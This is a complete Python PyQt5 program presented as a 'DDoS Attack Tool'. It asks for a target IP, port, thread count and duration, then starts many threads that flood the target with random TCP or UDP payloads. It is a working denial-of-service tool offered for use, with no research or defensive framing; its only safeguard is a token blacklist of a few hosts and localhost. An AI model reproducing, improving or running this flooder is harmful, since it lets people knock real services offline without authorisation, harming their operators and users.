import sys
import socket
import threading
import random
from time import sleep
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton,
    QProgressBar, QHBoxLayout, QMessageBox, QTextEdit, QComboBox
)
from PyQt5.QtGui import QIcon, QPainter, QColor, QMouseEvent
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPoint

BLACKLIST = ["1.1.1.1", "nasa.gov", "fbi.gov"]

class PacketDisplayWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Packet Display")
        self.setGeometry(100, 100, 400, 300)

        layout = QVBoxLayout()

        self.packet_text = QTextEdit()
        self.packet_text.setReadOnly(True)

        layout.addWidget(self.packet_text)
        self.setLayout(layout)

    def update_packets(self, packet_info):
        self.packet_text.append(packet_info)

class AttackThread(QThread):
    update_progress = pyqtSignal(int)
    attack_finished = pyqtSignal(str)
    update_packets = pyqtSignal(str)

    def __init__(self, ip, port, threads, time, method):
        super().__init__()
        self.ip = ip
        self.port = port
        self.threads = threads
        self.time = time
        self.method = method
        self.running = True

    def run(self):
        try:
            for i in range(101):
                sleep(0.1)
                self.update_progress.emit(i)
                if not self.running:
                    self.update_progress.emit(0)
                    self.attack_finished.emit("Attack stopped.")
                    return
                if i == 100:
                    self.update_progress.emit(0)
                    self.attack_finished.emit(f"Attack Sent To {self.ip}:{self.port} With {self.threads} Threads For {self.time} Seconds")
                    break
            for _ in range(int(self.threads)):
                if not self.running:
                    return
                t = threading.Thread(target=self.method, args=(self.ip, self.port, self.time, self.update_packets))
                t.start()
        except Exception as e:
            self.update_packets.emit(f"Error: {e}")

    def stop(self):
        self.running = False

def tcp_attack(ip, port, time, update_packets):
    try:
        data = random._urandom(1024)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        update_packets.emit(f"TCP Packet sent to {ip}:{port}")
        s.send(data)
        for _ in range(int(time)):
            s.send(data)
            update_packets.emit(f"TCP Packet sent to {ip}:{port}")
    except Exception as e:
        update_packets.emit(f"TCP Packet failed to {ip}:{port}: {e}")
    finally:
        s.close()

def udp_attack(ip, port, time, update_packets):
    try:
        data = random._urandom(1024)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        update_packets.emit(f"UDP Packet sent to {ip}:{port}")
        s.sendto(data, (ip, int(port)))
        for _ in range(int(time)):
            s.sendto(data, (ip, int(port)))
            update_packets.emit(f"UDP Packet sent to {ip}:{port}")
    except Exception as e:
        update_packets.emit(f"UDP Packet failed to {ip}:{port}: {e}")
    finally:
        s.close()

class DDoSAttackUI(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("DDoS Attack Tool")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)

        self.setWindowFlags(self.windowFlags() | Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)

        self.oldPos = self.pos()

        layout = QVBoxLayout()

        self.setStyleSheet("""
            QWidget {
                background: rgba(255, 255, 255, 150);
                color: black;
                border: 1px solid rgba(255, 255, 255, 200);
                border-radius: 10px;
            }
            QPushButton {
                background: rgba(0, 0, 0, 100);
                color: white;
                border: 1px solid rgba(255, 255, 255, 200);
                padding: 5px 10px;
                border-radius: 5px;
            }
            QPushButton:hover {
                background: rgba(0, 0, 0, 150);
            }
            QLineEdit, QLabel, QComboBox {
                background: rgba(255, 255, 255, 100);
                padding: 5px;
                border: 1px solid rgba(255, 255, 255, 200);
                border-radius: 5px;
            }
            QProgressBar {
                background: rgba(0, 0, 0, 50);
                color: black;
                border-radius: 5px;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: rgba(0, 0, 255, 150);
                border-radius: 5px;
            }
        """)

        title_bar = QHBoxLayout()
        title_bar.setContentsMargins(0, 0, 0, 0)

        title = QLabel("DDoS Attack Tool")
        title.setStyleSheet("padding: 10px; font-size: 16px;")

        close_button = QPushButton("X")
        close_button.setFixedSize(30, 30)
        close_button.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: black;
                border: 1px solid black;
                border-radius: 2px;
                font-size: 16px;
            }
            QPushButton:hover {
                background: rgba(255, 0, 0, 150);
                color: white;
            }
        """)
        close_button.clicked.connect(self.close)

        title_bar.addWidget(title)
        title_bar.addStretch()
        title_bar.addWidget(close_button)

        layout.addLayout(title_bar)

        self.ip_label = QLabel("Target IP:")
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Enter Target IP")

        self.port_label = QLabel("Port:")
        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Enter Port Number")

        self.threads_label = QLabel("Threads:")
        self.threads_input = QLineEdit()
        self.threads_input.setPlaceholderText("Enter Number of Threads")

        self.time_label = QLabel("Duration (seconds):")
        self.time_input = QLineEdit()
        self.time_input.setPlaceholderText("Enter Duration in Seconds")

        self.method_label = QLabel("Method:")
        self.method_combo = QComboBox()
        self.method_combo.addItems(["TCP", "UDP"])

        self.start_button = QPushButton("Start Attack")
        self.start_button.clicked.connect(self.start_attack)

        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)

        self.progress_label = QLabel("Progress:")
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)

        self.creator_label = QLabel("Created By: Fyyx")
        self.creator_label.setStyleSheet("color: black; font-size: 12px;")

        layout.addWidget(self.ip_label)
        layout.addWidget(self.ip_input)
        layout.addWidget(self.port_label)
        layout.addWidget(self.port_input)
        layout.addWidget(self.threads_label)
        layout.addWidget(self.threads_input)
        layout.addWidget(self.time_label)
        layout.addWidget(self.time_input)
        layout.addWidget(self.method_label)
        layout.addWidget(self.method_combo)
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)
        layout.addWidget(self.progress_label)
        layout.addWidget(self.progress_bar)
        layout.addWidget(self.creator_label)

        self.setLayout(layout)

        self.attack_thread = None
        self.packet_window = None

    def start_attack(self):
        ip = self.ip_input.text().strip()
        port = self.port_input.text().strip()
        threads = self.threads_input.text().strip()
        time = self.time_input.text().strip()
        method = self.method_combo.currentText()

        if not ip or not port or not threads or not time:
            self.show_error("Error", "Please fill in all fields.")
            return
        if ip in BLACKLIST or ip in ("127.0.0.1", "localhost"):
            self.show_error("Error", "IP is blacklisted or invalid.")
            return
        if not (port.isdigit() and threads.isdigit() and time.isdigit()):
            self.show_error("Error", "Port, Threads, and Time must be numeric values.")
            return

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)

        self.packet_window = PacketDisplayWindow()
        self.packet_window.show()

        attack_method = tcp_attack if method == "TCP" else udp_attack
        self.attack_thread = AttackThread(ip, port, threads, time, attack_method)
        self.attack_thread.update_progress.connect(self.update_progress)
        self.attack_thread.attack_finished.connect(self.show_message)
        self.attack_thread.update_packets.connect(self.packet_window.update_packets)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread:
            self.attack_thread.stop()
            self.stop_button.setEnabled(False)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def show_message(self, message):
        self.show_info("Info", message)
        if self.packet_window:
            self.packet_window.close()
        self.start_button.setEnabled(True)

    def show_info(self, title, message):
        msg_box = QMessageBox()
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.exec_()

    def show_error(self, title, message):
        msg_box = QMessageBox()
        msg_box.setWindowTitle(title)
        msg_box.setIcon(QMessageBox.Critical)
        msg_box.setText(message)
        msg_box.exec_()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setBrush(QColor(255, 255, 255, 180))
        painter.setPen(QColor(255, 255, 255, 200))
        rect = self.rect()
        rect.setWidth(rect.width() - 1)
        rect.setHeight(rect.height() - 1)
        painter.drawRoundedRect(rect, 10, 10)

    def mousePressEvent(self, event: QMouseEvent):
        if event.button() == Qt.LeftButton:
            self.oldPos = event.globalPos()
            event.accept()

    def mouseMoveEvent(self, event: QMouseEvent):
        if event.buttons() == Qt.LeftButton:
            delta = QPoint(event.globalPos() - self.oldPos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.oldPos = event.globalPos()
            event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)

    window = DDoSAttackUI()
    window.show()

    sys.exit(app.exec_())
